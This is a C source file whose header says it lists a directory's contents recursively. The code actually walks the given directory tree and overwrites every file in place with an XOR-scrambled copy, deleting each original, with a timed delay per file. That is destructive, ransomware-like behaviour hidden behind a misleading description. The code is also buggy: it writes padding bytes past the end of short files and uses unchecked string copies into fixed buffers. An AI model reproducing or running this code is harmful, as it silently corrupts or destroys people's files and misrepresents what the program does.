/**
 * C program to list contents of a directory recursively.
 */

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <time.h>
#include <windows.h>


typedef const char* LPCSTR;

void listFilesRecursively(char *path);

char path[200];
double secondsToAdd;
const int DEBUG = 0;

int main(int argc, char *argv[])
{

    //Doesn't deal with spaces, need to fix.
	printf("%s \n", argv[1]);
	strcpy(path, argv[1]);
	sscanf(argv[2], "%lf", &secondsToAdd);
	
	printf("%.7lf\n", secondsToAdd);
    listFilesRecursively(path);

    return 0;
}


int encryptFile(char *basePath) {
	FILE *fpts, *fptt;
	char fname[20], ch;
	char fullPath[200];
	
	FILE *file = NULL;
	FILE *write_ptr = NULL;
	unsigned char buffer[1024];  // array of bytes, not pointers-to-bytes
	unsigned char newBuffer[1024];
	size_t bytesRead = 0;
	int i = 0;
	//unsigned int retTime = time(0) + secondsToAdd;
	//while (time(0) < retTime);
	Sleep(secondsToAdd);



	file = fopen(basePath, "rb");   
	
	if (file != NULL)    
	{
		strcpy(fullPath, basePath);
		strcat(fullPath, ".temp");
		write_ptr = fopen(fullPath,"wb");
		if (write_ptr == NULL) {
			printf("My momma is null\n");
			printf("%s\n", fullPath);
			return 0;
		}
		// read up to sizeof(buffer) bytes
		while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0)
  		{
  			for (i = 0; i < 1024; i++){
  				newBuffer[i] = buffer[i] ^ 10;

  			}
			fwrite(newBuffer,sizeof(newBuffer),1,write_ptr);
  		}
	}
	else {
		printf("My momma is null\n");
		return 0;
	}
	fclose(write_ptr);
	fclose(file);
	remove(basePath);
	rename(fullPath, basePath);

	return 0;

}

/**
 * Lists all files and sub-directories recursively 
 * considering path as base path.
 */
void listFilesRecursively(char *basePath)
{
    char path[1000];
    struct dirent *dp;
    DIR *dir = opendir(basePath);

    // Unable to open directory stream
    if (!dir) {
		if (DEBUG == 1) {
			printf("%s\n", basePath);
		}
    	encryptFile(basePath);
        return;
    }

    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {
            //printf("%s\n", dp->d_name);

            // Construct new path from our base path
            strcpy(path, basePath);
            strcat(path, "/");
            strcat(path, dp->d_name);


            listFilesRecursively(path);
        }
    }

    closedir(dir);
}